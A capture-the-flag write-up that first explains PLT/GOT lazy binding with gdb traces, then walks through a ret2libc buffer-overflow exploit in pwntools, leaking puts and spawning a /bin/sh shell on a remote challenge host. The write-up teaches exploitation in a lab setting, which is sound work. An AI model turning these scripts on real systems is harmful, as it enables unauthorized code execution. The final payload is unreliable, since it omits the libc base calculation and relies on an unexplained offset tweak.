## Ret2libc

The challenge was from HTB but got deleted. Before doing the ret2libc. We will talk about `PLT` and `GOT`. 

### Theoritical reminders

First of all, it is worthwhile to make some reminders about compiling and linking binaries. When compiling a program that uses functions located in other libraries (such as the standard library), linking can be done in two different ways. The first method, called static, consists in integrating into the executable all the libraries it needs to work. At runtime, all the symbols are thus resolved, and the calls are immediate. If this method was the most used in the old versions of OS, it is however largely outdated. Indeed, it is a waste of disk space, since it forces to duplicate each library as many times as there are executables using it. The generated executables are therefore very large, since a simple call to printf() is enough for the whole standard C library to be integrated into the executable!

Since the "recent" versions of Linux, it is the second method of link edition, called dynamic, which is used by default. With this method, each library is compiled once and for all into a dynamic or shared library with the extension` .so` (equivalent to `.dll `under Windows). When compiling a program that refers to it, we just insert the name of the symbol (function or variable) that it needs, as well as the name of the library. When the program is executed, the dynamic linker, named `ld.so`, loads the necessary libraries and resolves the missing symbols in real time. It is therefore the execution speed that is penalized, even if we will see that this loss is relative because it is compensated by a system of address caching.

Finally, it is necessary to clarify the notion of` PIC`, or `Position Independent Code`. An executable code is said to be` PIC` if it can be mapped to any memory region while being able to execute properly. In such executables, no absolute address must appear, since if the executable is translated into memory, the absolute addresses will no longer be valid. In Linux, the dynamic libraries are in` PIC`. It is the dynamic linker, `ld.so`, which loads them into memory at runtime, and their place in memory may vary from one run to another. Thus, the address of the standard library functions, such as `printf()`, change place at each execution. However, a program that uses `printf(`) is compiled only once. So how do processes manage to run while taking this address variation into account? That is the purpose of this article...

### A test program
Let's go to the practice ! In the following, I will consider that we are on an Ubuntu Hardy (`kernel 2.6.24`), with `gcc 4.2.3 `and `gdb 6.8`. We will use the following C program:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
  char c1[] = "chain1";
  char c2[] = "chain2";

  int res = strcmp(c1, c2);

  printf("c1 == c2 ? %dn", res);

  return 0;
}
```
To illustrate what we have just seen, let's compile it with the two methods, static and dynamic:
```bash
$ gcc -o bin_str bin_str.c
$ gcc -static -o bin_str_static bin_str.c
```
Note by the way that gcc links executables dynamically by default, and that the -static option allows to force static linking. At runtime, both produce exactly the same result:
```bash
$ ./bin_str
c1 == c2 ? -1
$ ./bin_str_static
c1 == c2 ? -1
```
However, when you compare the size of the executables...
```bash
$ ls -lh bin_str bin_str_static
-rwxrwxrwx 1 root root 6,6K 2008-07-21 19:12 bin_str
-rwxrwxrwx 1 root root 545K 2008-07-21 19:12 bin_str_static
```
We can see that the statically linked binary (545K) is 80 times larger than the dynamically linked binary (which weighs only 6.6K)! Indeed, it is all the standard library which was incorporated into the binary during the link edition.

Let's disassembl them:
```bash
$ gdb ./bin_str_static
(gdb) disas main
Dump of assembler code for function main:
...
0x0804823b <main+75>:   call   0x804dd70 <strcmp>
...
0x08048251 <main+97>:   call   0x8048c70 <printf>
...
(gdb) quit

$ gdb ./bin_str
(gdb) disas main
Dump of assembler code for function main:
...
0x0804844f <main+75>:   call   0x8048364 <strcmp@plt>
...
0x08048465 <main+97>:   call   0x8048344 <printf@plt>
```
We can see that in the statically linked binary, `printf()` and `strcmp()` were indeed integrated in the .text region of the executable. In the dynamically linked binary, however, the two calls do not take place in the .text region, but in a region specific to dynamic link editing: the `.plt.` The PLT, for *Procedure Linkage Table*, is a table used to link with functions located in dynamic libraries.

In the following, we will obviously only work with the dynamically linked binary. Let's list the regions currently mapped in the memory space of the executable:

```asm
(gdb) info files
...
0x080482e4 - 0x08048314 is .init
0x08048314 - 0x08048374 is .plt
0x08048380 - 0x0804852c is .text
0x0804852c - 0x08048548 is .fini
0x08048548 - 0x0804856f is .rodata
0x08048570 - 0x08048574 is .eh_frame
0x08049574 - 0x0804957c is .ctors
0x0804957c - 0x08049584 is .dtors
0x08049584 - 0x08049588 is .jcr
0x08049588 - 0x08049658 is .dynamic
0x08049658 - 0x0804965c is .got
0x0804965c - 0x0804967c is .got.plt
0x0804967c - 0x08049688 is .data
0x08049688 - 0x0804968c is .bss
```
The` .plt` region is therefore mapped between addresses `0×08048314` and `0×08048374`. It is important to note that this section is at fixed addresses. We check in passing that the addresses called by the two calls of main (`0×8048364` for `strcmp` and `0×8048344 `for `printf`) do belong to this area. Let's now disassemble the `.plt` region:
```asm
(gdb) disas 0x08048314 0x08048374
Dump of assembler code from 0x8048314 to 0x8048374:
0x08048314 <_init+48>:  pushl  0x8049660
0x0804831a <_init+54>:  jmp    *0x8049664
0x08048320 <_init+60>:  add    %al,(%eax)
0x08048322 <_init+62>:  add    %al,(%eax)
0x08048324 <__gmon_start__@plt+0>:      jmp    *0x8049668
0x0804832a <__gmon_start__@plt+6>:      push   $0x0
0x0804832f <__gmon_start__@plt+11>:     jmp    0x8048314 <_init+48>
0x08048334 <__libc_start_main@plt+0>:   jmp    *0x804966c
0x0804833a <__libc_start_main@plt+6>:   push   $0x8
0x0804833f <__libc_start_main@plt+11>:  jmp    0x8048314 <_init+48>
0x08048344 <printf@plt+0>:      jmp    *0x8049670
0x0804834a <printf@plt+6>:      push   $0x10
0x0804834f <printf@plt+11>:     jmp    0x8048314 <_init+48>
0x08048354 <__stack_chk_fail@plt+0>:    jmp    *0x8049674
0x0804835a <__stack_chk_fail@plt+6>:    push   $0x18
0x0804835f <__stack_chk_fail@plt+11>:   jmp    0x8048314 <_init+48>
0x08048364 <strcmp@plt+0>:      jmp    *0x8049678
0x0804836a <strcmp@plt+6>:      push   $0x20
0x0804836f <strcmp@plt+11>:     jmp    0x8048314 <_init+48>
End of assembler dump.
```
Overall, we can see that the `.plt` section is composed of several subsections of equal size (`0×10` or 16 bytes), which we will call entries. Entry `0` (composed of the first 4 instructions) is a bit special; we will come back to it later. The other inputs, from 1 to the last one, are composed of 3 i`nstructions` which always follow the same pattern. A first` jmp` takes place, whose jump address is not explicitly given in the instruction, but through a pointer. For example, in the case of input 3 corresponding to printf, the jump address is in the 4 bytes pointed by the address` 0×8049670 `which thus acts as a pointer. We notice that the 2nd instruction of input 0 also contains a jmp with pointer. If we look more closely at each pointer, including that of input 0 (`0×8049664`), we can see that they are all located one after the other. Indeed, we have here: `0×8049664`, `0×8049668`, `0x804966c`, `0×8049670`, `0×8049674`, and `0×8049678.` To find out where these pointers are, we just have to look again at the list of memory-mapped sections:
```asm
gdb) info files
...
0x0804957c - 0x08049584 is .dtors
0x08049584 - 0x08049588 is .jcr
0x08049588 - 0x08049658 is .dynamic
0x08049658 - 0x0804965c is .got  <=====
0x0804965c - 0x0804967c is .got.plt
```
These addresses are therefore located in the section named `.got.plt`. The regions named here` .got` and `.got.plt` are in reality part of a table, which we call the `GOT`, for *Global Offset Table*. The role of this table will be explained in the following.

Let us now display its contents. Since this region contains pointers, it is data and not instructions; to display its contents it is therefore necessary to use the `x` instruction of `gdb`, and not `disas`. Moreover, the previous command tells us that the section is `0×20 `= `32 bytes` long, `i.e.` `8` pointers of `4 bytes`.
```asm
(gdb) x/8x 0x0804965c
0x804965c <_GLOBAL_OFFSET_TABLE_>:      0x08049588      0x00000000
                                        0x00000000      0x0804832a
0x804966c <_GLOBAL_OFFSET_TABLE_+16>:   0x0804833a      0x0804834a
                                        0x0804835a      0x0804836a
```

I remind you that for the moment, the program has not yet been launched. The content of this section is fixed, at least before each execution. It is quite possible to see it using other tools such as objdump.

As we have just seen, the entries in the `PLT` reference pointers located in the` GOT`. To understand the role of these two tables, let's look at how a call to `strcmp()` works. This function is located in entry 3 of the PLT :
```asm
0x08048364 <strcmp@plt+0>:      jmp    *0x8049678
0x0804836a <strcmp@plt+6>:      push   $0x20
0x0804836f <strcmp@plt+11>:     jmp    0x8048314 <_init+48>
```
The 1st `jmp` references a pointer (`0×8049678`) located in the `GOT`. Let's see what it contains:
```asm
(gdb) x 0x8049678
0x8049678 <_GLOBAL_OFFSET_TABLE_+28>:   0x0804836a
```
Its value wants `0x0804834a`, which corresponds... to an address of the `PLT`, and more precisely to the address of the instruction just after the `jmp`. In other words, when `strcmp()` is called, we jump into the `PLT`, and execute the 1st jmp, which just jumps to the next instruction. This may seem unnecessary at first glance, but we'll see the trick behind it later. Let's continue the execution thread: after this 1st `jmp`, we meet a` push`, which stacks a certain value, here `0×20`. Finally, we meet a jmp, and by examining the jump address we see that it takes us to the 0 entry of the PLT.

Once on input `0`, we encounter two instructions (the next two are not really instructions, but correspond to opcodes `0×0000`):
```asm
0x08048314 <_init+48>:  pushl  0x8049660
0x0804831a <_init+54>:  jmp    *0x8049664
```
We start by stacking a value, which turns out to be the entry 1 of the` GOT`. We then perform a `jmp` on the content of a pointer, also located in the `GOT` but at input` 2`. For the moment, this pointer contains only zeros, as the execution has not yet started. Let's place a breakpoint on the call to `strcmp()`, and examine the value of the pointer.
```asm
(gdb) b *0x0804844f         //Corresponding to the call   0x8048364 <strcmp@plt>
Breakpoint 1 at 0x804844f
```
```asm
(gdb) r
Starting program: /media/echange/Hacking/Reversing_Linux/plt_got/bin_str

Breakpoint 1, 0x0804844f in main ()
Current language:  auto; currently asm

(gdb) x 0x8049664
0x8049664 <_GLOBAL_OFFSET_TABLE_+8>:    0xb7f12c40
```
We can see that once the program has been launched, the value of the pointer has been modified. It is the procedure for launching the executable that has in fact initialized this value. Where does it point to?
```asm
(gdb) info files
...<SNIP>...
0x08049658 - 0x0804965c is .got
0x0804965c - 0x0804967c is .got.plt
0x0804967c - 0x08049688 is .data
0x08049688 - 0x0804968c is .bss
0xb7f000f4 - 0xb7f001b4 is .hash in /lib/ld-linux.so.2
0xb7f001b4 - 0xb7f00298 is .gnu.hash in /lib/ld-linux.so.2
0xb7f00298 - 0xb7f00468 is .dynsym in /lib/ld-linux.so.2
0xb7f00468 - 0xb7f005fc is .dynstr in /lib/ld-linux.so.2
0xb7f005fc - 0xb7f00636 is .gnu.version in /lib/ld-linux.so.2
0xb7f00638 - 0xb7f00700 is .gnu.version_d in /lib/ld-linux.so.2
0xb7f00700 - 0xb7f00760 is .rel.dyn in /lib/ld-linux.so.2
0xb7f00760 - 0xb7f00788 is .rel.plt in /lib/ld-linux.so.2
0xb7f00788 - 0xb7f007e8 is .plt in /lib/ld-linux.so.2
0xb7f007f0 - 0xb7f157af is .text in /lib/ld-linux.so.2  <=====
0xb7f157b0 - 0xb7f158e1 is __libc_freeres_fn in /lib/ld-linux.so.2
0xb7f15900 - 0xb7f19320 is .rodata in /lib/ld-linux.so.2
0xb7f19320 - 0xb7f1941c is .eh_frame_hdr in /lib/ld-linux.so.2
0xb7f1941c - 0xb7f19850 is .eh_frame in /lib/ld-linux.so.2
0xb7f1acc0 - 0xb7f1af28 is .data.rel.ro in /lib/ld-linux.so.2
0xb7f1af28 - 0xb7f1afe0 is .dynamic in /lib/ld-linux.so.2
0xb7f1afe0 - 0xb7f1afe8 is .got in /lib/ld-linux.so.2
0xb7f1aff4 - 0xb7f1b014 is .got.plt in /lib/ld-linux.so.2
0xb7f1b020 - 0xb7f1b5b0 is .data in /lib/ld-linux.so.2
0xb7f1b5b0 - 0xb7f1b5b4 is __libc_subfreeres in /lib/ld-linux.so.2
0xb7f1b5b4 - 0xb7f1b668 is .bss in /lib/ld-linux.so.2
0xb7d9c174 - 0xb7d9c194 is .note.ABI-tag in /lib/tls/i686/cmov/libc.so.6
0xb7d9c194 - 0xb7d9fcbc is .gnu.hash in /lib/tls/i686/cmov/libc.so.6
0xb7d9fcbc - 0xb7da8a8c is .dynsym in /lib/tls/i686/cmov/libc.so.6
0xb7da8a8c - 0xb7dae274 is .dynstr in /lib/tls/i686/cmov/libc.so.6
...<SNIP>...
```
The region containing this address is nothing else than the` .text `of the dynamic linker, `ld.so`! We are in the function of the linker allowing to call the real `strcmp() `function.

### The resolution of the symbols
But how does the linker know that `strcmp()` should be called and not another function? Simply thanks to the previous `0×20` `push`: `0×20` corresponds in fact to an offset corresponding here to `strcmp()`. The instructions of the` PLT` have stacked it in order to pass it as a parameter to the linker function.

Let's disassemble this function:
```asm
(gdb) disas 0xb7ff6c40 0xb7ff6c40+28
//The +28 was found by tapping until a ret is found
Dump of assembler code from 0xb7f12c40 to 0xb7f12c5c:
0xb7f12c40:     push   %eax
0xb7f12c41:     push   %ecx
0xb7f12c42:     push   %edx
0xb7f12c43:     mov    0x10(%esp),%edx
0xb7f12c47:     mov    0xc(%esp),%eax
0xb7f12c4b:     call   0xb7f0d350
0xb7f12c50:     pop    %edx
0xb7f12c51:     mov    (%esp),%ecx
0xb7f12c54:     mov    %eax,(%esp)
0xb7f12c57:     mov    0x4(%esp),%eax
0xb7f12c5b:     ret    $0xc
End of assembler dump.
```

This function is relatively short; it really just calls the actual address resolution function. When it is called, the top of the stack contains an address (corresponding to `GOT[1]`, which has been `push`ed to `PLT` entry 0), and just below it is the index of `strcmp`, which is `0×20`. Let's check by placing a breakpoint at the beginning and examining the stack:
```asm
(gdb) b *0xb7f12c40
Breakpoint 2 at 0xb7f12c40

(gdb) c
Continuing.

Breakpoint 2, 0xb7f12c40 in ?? () from /lib/ld-linux.so.2

(gdb) x/2x $esp
0xbfbf50b4:     0xb7f1b668      0x00000020
```
Let's check that the 1st pointer corresponds to the entry 1 of the `GOT` :
```asm
(gdb) x 0x8049660
0x8049660 <_GLOBAL_OFFSET_TABLE_+4>:    0xb7f1b668
```
Bingo! We have the address contained in `GOT[1]` at the top of the stack and just below it the index of `strcmp()`, `0×20`.
Let's go back to the code of this function.
```asm
(gdb) disas 0xb7f12c40 0xb7f12c40+28
Dump of assembler code from 0xb7f12c40 to 0xb7f12c5c:
0xb7f12c40:     push   %eax
0xb7f12c41:     push   %ecx
0xb7f12c42:     push   %edx
0xb7f12c43:     mov    0x10(%esp),%edx
0xb7f12c47:     mov    0xc(%esp),%eax
0xb7f12c4b:     call   0xb7f0d350
0xb7f12c50:     pop    %edx
0xb7f12c51:     mov    (%esp),%ecx
0xb7f12c54:     mov    %eax,(%esp)
0xb7f12c57:     mov    0x4(%esp),%eax
0xb7f12c5b:     ret    $0xc
End of assembler dump.
```
It starts with 3` push`es, allowing to save registers. Thus, our two values at the top of the stack will be shifted by `3*4` =` 12 bytes`. Just after these `3 push`es, we have two moves. The first one places in `%edx` a value located on the stack at offset `0×10` that is to say` 16` = `4 * 4 bytes`. It is thus the index of `strcmp()`,` 0×20`. The second one places in `%eax` the next value, that is to say the one of `GOT[1]`. Then a function call takes place.

We arrive then in a relatively complex function, which is always located in the .text section of `ld.so`. It is in charge of performing the symbol resolution by searching in the libraries. If you try to disassemble it, you will see that it is quite long and complex. As the goal here is not to be exhaustive, I won't detail it. Besides, I haven't yet had the courage to go through it in its smallest details...
So let's continue. Let's place a breakpoint just after the call of this function, in `0xb7f12c50`.
```asm
gdb) b *0xb7f12c50
Breakpoint 3 at 0xb7f12c50

(gdb) c
Continuing.

Breakpoint 3, 0xb7f12c50 in ?? () from /lib/ld-linux.so.2
```

The following instructions manipulate registers. For the purpose of this article, only two instructions are of interest:
```asm
0xb7f12c54:     mov    %eax,(%esp)
et
0xb7f12c5b:     ret    $0xc
```
The `mov` places the value of `%eax` on top of the stack, while the ret tells the CPU to continue executing the code at the address on top of the stack. In other words, just after the call of the symbol resolution function, we jump to the address contained in `%eax`! Let's see what this register is worth...
```asm
(gdb) info registers
eax            0xb7e0dd20       -1210000096
ecx            0x0      0
edx            0x8049678        134518392
ebx            0xb7ee6ff4       -1209110540
esp            0xbfbf50a8       0xbfbf50a8
ebp            0xbfbf50f8       0xbfbf50f8
esi            0xb7f1ace0       -1208898336
edi            0x0      0
eip            0xb7f12c50       0xb7f12c50
...<SNIP>...
```
What can the address` 0xb7e0dd20` represent?
```
(gdb) info files
...<SNIP>...
0xb7d9c174 - 0xb7d9c194 is .note.ABI-tag in /lib/tls/i686/cmov/libc.so.6
0xb7d9c194 - 0xb7d9fcbc is .gnu.hash in /lib/tls/i686/cmov/libc.so.6
0xb7d9fcbc - 0xb7da8a8c is .dynsym in /lib/tls/i686/cmov/libc.so.6
0xb7da8a8c - 0xb7dae274 is .dynstr in /lib/tls/i686/cmov/libc.so.6
0xb7dae274 - 0xb7daf42e is .gnu.version in /lib/tls/i686/cmov/libc.so.6
0xb7daf430 - 0xb7daf730 is .gnu.version_d in /lib/tls/i686/cmov/libc.so.6
0xb7daf730 - 0xb7daf770 is .gnu.version_r in /lib/tls/i686/cmov/libc.so.6
0xb7daf770 - 0xb7db2140 is .rel.dyn in /lib/tls/i686/cmov/libc.so.6
0xb7db2140 - 0xb7db2188 is .rel.plt in /lib/tls/i686/cmov/libc.so.6
0xb7db2188 - 0xb7db2228 is .plt in /lib/tls/i686/cmov/libc.so.6
0xb7db2230 - 0xb7eb2d84 is .text in /lib/tls/i686/cmov/libc.so.6  <=====
0xb7eb2d90 - 0xb7eb3de8 is __libc_freeres_fn in /lib/tls/i686/cmov/libc.so.6
0xb7eb3df0 - 0xb7eb4082 is __libc_thread_freeres_fn in /lib/tls/i686/cmov/libc.so.6
0xb7eb40a0 - 0xb7ecf090 is .rodata in /lib/tls/i686/cmov/libc.so.6
0xb7ecf090 - 0xb7ecf0a3 is .interp in /lib/tls/i686/cmov/libc.so.6
0xb7ecf0a4 - 0xb7ed1c90 is .eh_frame_hdr in /lib/tls/i686/cmov/libc.so.6
0xb7ed1c90 - 0xb7ee1544 is .eh_frame in /lib/tls/i686/cmov/libc.so.6
0xb7ee1544 - 0xb7ee19b0 is .gcc_except_table in /lib/tls/i686/cmov/libc.so.6
0xb7ee19b0 - 0xb7ee4d28 is .hash in /lib/tls/i686/cmov/libc.so.6
0xb7ee51ec - 0xb7ee51f4 is .tdata in /lib/tls/i686/cmov/libc.so.6
...<SNIP>...
```

It is in the` .text`... By any chance, it would not be the address of `strcmp`?

```asm
(gdb) p strcmp
$1 = {<text variable, no debug info>} 0xb7e0dd20 <strcmp>
```

### And the GOT in all this?
We have just seen the path (from a rather high level point of view) of a function call located in a shared library. As we have seen, each function call leads to a symbol resolution, which seems tedious. Fortunately, by default, ld.so does not resolve a symbol every time you try to access it, but only the first time. For example, if you have 10 calls to `strcmp()` in a program, the 1st call will result in a resolution, and the address of `strcmp() `will be kept in memory for the next 9 calls. This is called lazy evaluation: you do only the minimum amount of operation, and just in time.

Where and how are the addresses of the symbols kept in memory once they are solved? Answer: in the` GOT`! To understand this, let's run the program again and place a breakpoint in the `PLT` entry corresponding to `strcmp`.

```asm
$ gdb ./bin_str

(gdb) disas 0x08048314 0x08048374   //Les adresses de la PLT, qui restent fixes
Dump of assembler code from 0x8048314 to 0x8048374:
0x08048314 <_init+48>:  pushl  0x8049660
0x0804831a <_init+54>:  jmp    *0x8049664
0x08048320 <_init+60>:  add    %al,(%eax)
0x08048322 <_init+62>:  add    %al,(%eax)
0x08048324 <__gmon_start__@plt+0>:      jmp    *0x8049668
0x0804832a <__gmon_start__@plt+6>:      push   $0x0
0x0804832f <__gmon_start__@plt+11>:     jmp    0x8048314 <_init+48>
0x08048334 <__libc_start_main@plt+0>:   jmp    *0x804966c
0x0804833a <__libc_start_main@plt+6>:   push   $0x8
0x0804833f <__libc_start_main@plt+11>:  jmp    0x8048314 <_init+48>
0x08048344 <printf@plt+0>:      jmp    *0x8049670
0x0804834a <printf@plt+6>:      push   $0x10
0x0804834f <printf@plt+11>:     jmp    0x8048314 <_init+48>
0x08048354 <__stack_chk_fail@plt+0>:    jmp    *0x8049674
0x0804835a <__stack_chk_fail@plt+6>:    push   $0x18
0x0804835f <__stack_chk_fail@plt+11>:   jmp    0x8048314 <_init+48>
0x08048364 <strcmp@plt+0>:      jmp    *0x8049678
0x0804836a <strcmp@plt+6>:      push   $0x20
0x0804836f <strcmp@plt+11>:     jmp    0x8048314 <_init+48>
End of assembler dump.

(gdb) b *0x08048364
Breakpoint 1 at 0x8048364

(gdb) r
Starting program: /media/echange/Hacking/Reversing_Linux/plt_got/bin_str

Breakpoint 1, 0x08048364 in strcmp@plt ()
Current language:  auto; currently asm

(gdb) x 0x8049678
0x8049678 <_GLOBAL_OFFSET_TABLE_+28>:   0x0804836a
```

The corresponding entry in the `GOT` always contains the address of the next instruction in the `PLT`. What is the point? At this point, note that the `strcmp `symbol is not yet resolved, so it is normal that this entry has no interesting value. Let's place a watchpoint on this `GOT` entry to see if it changes over time.
```asm
(gdb) watch *0x8049678
Hardware watchpoint 2: *134518392

(gdb) c
Continuing.
Hardware watchpoint 2: *134518392

Old value = 134513514
New value = -1209639648
0xb7f6545d in ?? () from /lib/ld-linux.so.2
```

Apparently, the value of the input has changed! Let's observe its new value:
```asm
(gdb) x 0x8049678
0x8049678 <_GLOBAL_OFFSET_TABLE_+28>:   0xb7e65d20

(gdb) p strcmp
$1 = {<text variable, no debug info>} 0xb7e65d20 <strcmp>
```

Thus we can see that it now corresponds to the address of `strcmp()`. From now on, if the program wants to make other calls to `strcmp()`, it will not have to perform the symbol resolution anymore since the jmp located in the `PLT` input directly references the address of `strcmp()`!

When was this value written? To find out, just look at `%eip `and see what zone we are in.
```asm
(gdb) info registers
eax            0xb7e65d20       -1209639648
ecx            0x0      0
edx            0x8049678        134518392
ebx            0xb7f72ff4       -1208537100
esp            0xbfae4f58       0xbfae4f58
ebp            0xbfae4f90       0xbfae4f90
esi            0xb7f56858       -1208653736
edi            0xb7f73668       -1208535448
eip            0xb7f6545d       0xb7f6545d
eflags         0x246    [ PF ZF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

(gdb) disas $eip-3 $eip+20
Dump of assembler code from 0xb7f6545a to 0xb7f65471:
0xb7f6545a:     mov    %eax,(%edx,%ecx,1)
0xb7f6545d:     lea    -0xc(%ebp),%esp
0xb7f65460:     pop    %ebx
0xb7f65461:     pop    %esi
0xb7f65462:     pop    %edi
0xb7f65463:     pop    %ebp
0xb7f65464:     ret
0xb7f65465:     xor    %edx,%edx
0xb7f65467:     jmp    0xb7f653de
0xb7f6546c:     lea    -0x2477(%ebx),%eax
...
```
If you look a little bit, you will notice that you are right at the end of the symbol resolution function. The instruction responsible for writing the address in the `GOT` is the mov `%eax`,(`%edx,%ecx,1`). By inspecting the registers, we see that this corresponds to the operation `*0×8049678` = `0xb7e65d20` (the address of `strcmp`).

Note that this method is comparable to processor caching systems: the objective is to speed up future accesses to functions by accessing a data once and placing it in a faster access area. For information, it is possible to disable this caching system by using environment variables recognized by `ld.so`. For example, the environment variable `LD_BIND_NOT`, if set, allows to completely disable the writing of addresses in the `GOT`, while the variable `LD_BIND_NOW `tells ld.so to perform all the resolutions from the beginning, so to fill the `GOT` as soon as the executable is launched. For more information, see the `ld.so` man.

### Summary
The following diagram traces the flow of execution during a call to `strcmp()`, and summarizes the different links between the `PLT` and the `GOT`.

###### 1st call of strcmp: symbol not yet resolved

```asm
main:
...
call   0x8048364 <strcmp@plt> ----+
mov    %eax,-0x1c(%ebp)           |
...                               |
                                  |
                                  |
0x8048364 (Entry of PLT) : <--+
jmp    *0x8049678  -----------------------> 0x8049678 (Entry in GOT) :
push   $0x20  <------------------------------ 0x0804836a
jmp    0x8048314 <_init+48> --------+
                                    |
                                    |
0x8048314 (Entry 0 of PLT) : <--+
pushl  0x8049660
jmp    *0x8049664  -----------------------> 0x8049664 (Header of GOT) :
                                              0xb7f12c40 --+
                                                           |
                                                           |
0xb7f12c40 (.text of ld.so, resolution + call) : <--------+
push   %eax              // Save of registers
push   %ecx
push   %edx
mov    0x10(%esp),%edx   // Backup of the code of the function strcmp (0x20)
mov    0xc(%esp),%eax
call   0xb7f4c350  -------> Call the symbol resolution function. The address of the 						                             symbol (strcmp) is placed in %eax. The .got entry is 					  		            				 patched with this address.
... <---------------------- Return of the function
mov    %eax,(%esp)       // the adress of strcmp (0xb7e65d20) is stacked
...
ret    $0xc ------------------------------+ // jump to strcmp
                                          |
0xb7e65d20 (strcmp, .text of libc): <--+
...
ret                      // Return to main
```

Translated by me from this site:
_Segmentation fault_. Segmentation fault RSS. (n.d.). Retrieved January 9, 2022, from https://www.segmentationfault.fr/linux/role-plt-got-ld-so/

### Examination

#### Ghidra

![image](https://user-images.githubusercontent.com/87600765/175791280-d896d76d-88ec-46a1-ba30-e94e1befb53c.png)

There is only one function which is `main`. A buffer of 64 bytes is set and a string is displayed. Then `fflush` is called followed by `fgets`. That's all. How can we do ? May be we can inject a shellcode but let's check the securities with gef.

```bash
gef➤  checksec
[+] checksec for '/mnt/c/Users/xx/documents/pwn/htb/ropme/ropme'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
MX is obviously enabled according to the name of the challenge. Only NX is enabled.NX or DEP (In Windows) is a protection really important for your binaries. It will "says to the stack to don't execute what there is in". So the stack will "refuse" to execute code on the stack. So we won't be able to inject a shellcode in it. 

#### Ret2libc

NX (No eXecution)is enabled so you won't be able to inject shellcode since the code in the stack won't be executed because of NX. As the name shows to use we have to use a return oriented programming technique (ROP) wich is a ret2libc. With this technique we will be able to get a shell because we will be able to call system with the argument /bin/sh.

##### Offset
Let's calculate the offset first and use gef. First I create a pattern of 100 bytes
```py
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
```
Then run the program and paste the bytes and do an `info frame`.
```py
gef➤  info frame
Stack level 0, frame at 0x7fffffffe488:
 rip = 0x40066c in main; saved rip = 0x616161616161616a
 Arglist at 0x6161616161616169, args:
 Locals at 0x6161616161616169, Previous frame's sp is 0x7fffffffe490
 Saved registers:
  rip at 0x7fffffffe488
```
Then we can do a pattern offset
```py
gef➤  pattern offset 0x616161616161616a
[+] Searching for '0x616161616161616a'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search)
gef➤
```
So we have to send 72 bytes before reaching rip. 

#### Exploit
Puts the requirements. 
```py
from pwn import *

elf = context.binary = ELF('./ropme')	
p = remote('206.189.125.37', 32733)		

libc = ""								# dont't know the libc yet
rop = ROP(elf)							# create a rop object
```

###### Find the gadgets
The ROP gadgets will allow us to call the function puts to find which version of libc is used.
Add to the exploit.py
```py
puts_plt = elf.plt['puts'] 
main_plt = elf.symbols['main'] 
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret  = (rop.find_gadget(['ret']))[0]
log.info("Address of Main is:" + hex(main_plt))
log.info("Address of puts@plt:" + hex(puts_plt))
log.info("The gadget pop rdi; ret found at:" + hex(pop_rdi))
```
`main_plt` = we call main for exploit the program every time we want. We have to put it at the end of each ROP to call the program again.
`pop_rdi` = use the pop rdi gadget to put the parameter in rdi because according to the calling convention the first parameter is put in RDI so we need to control it.
`puts_plt` = simply calling puts.

###### LIBC 
We have to find which version of the libc  is used. For this we have to leak the address of `puts `. Then we can research this adress in the libc-database and download the libc version.
```py
offset = b'A' * 0x48
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
log.info("Address of Main is:" + hex(main_plt))
log.info("Address of puts@plt:" + hex(puts_plt))
log.info("The gadget pop rdi; ret found at:" + hex(pop_rdi))

puts_got = elf.got['puts']
log.info("Address of puts@got:" + hex(puts_got))
payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
p.clean()
p.sendline(payload)
leak_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("Function puts leaked:" + hex(leak_puts))
```
First it will overwrite rip thanks to the `offset`. After that it will use the gadget `pop_rdi`. Thx to this the adress of `function_got` in the register` RDI`. In this case the `function_got ` will be `puts`.  Then there is `puts_plt` that will read the content of the `function_got`(where is there is puts) and then it will print the adress. Main is then called for re exploit the program. 

![image](https://user-images.githubusercontent.com/87600765/175792134-c4f79b0a-2084-4e43-9874-d208629681f0.png)


Then we can search the libc with this website https://libc.nullbyte.cat/ and put the leaked adress of `puts`.

![image](https://user-images.githubusercontent.com/87600765/175791875-1ea94890-5b23-42f4-a3bd-5212f4250b95.png)

Then you can click on it and download it. I think the both `libc` with `amd-64` is working. But in this case I chose the `0ubuntu10`

![image](https://user-images.githubusercontent.com/87600765/175791814-4a25c994-3d82-4f09-8a0a-e3d1305f18a8.png)

###### Final binary for found the address of puts 
```py
from pwn import *

elf = context.binary = ELF('./ropme')
p = remote('206.189.125.37', 32733)

libc = ""
rop = ROP(elf)

offset = b'A' * 0x48
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]
log.info("Address of Main is:" + hex(main_plt))
log.info("Address of puts@plt:" + hex(puts_plt))
log.info("The gadget pop rdi; ret found at:" + hex(pop_rdi))

puts_got = elf.got['puts']
log.info("Address of puts@got:" + hex(puts_got))
payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
p.clean()
p.sendline(payload)
leak_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("Function puts leaked:" + hex(leak_puts))
p.interactive()
```

###### SHELL
We did the biggest part. Now that we have the libc you can replace `libc = ""` by `libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")`.
So thx to the base libc adress we will be able to have the `binsh` string address and the `system` adress. 
```py
# shell
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh')) - 64
final_payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.clean()
p.sendline(final_payload)
p.interactive()
```
The final payload will call `pop_rdi` that point on the string `/bin/sh` (that will be the parameter of system)and then will call the `system` function.
If you don't put `- 64` after the binsh variable you will have this weird error 
```
sh: 1: %s%s%s%s%s%s%s%s: not found
```

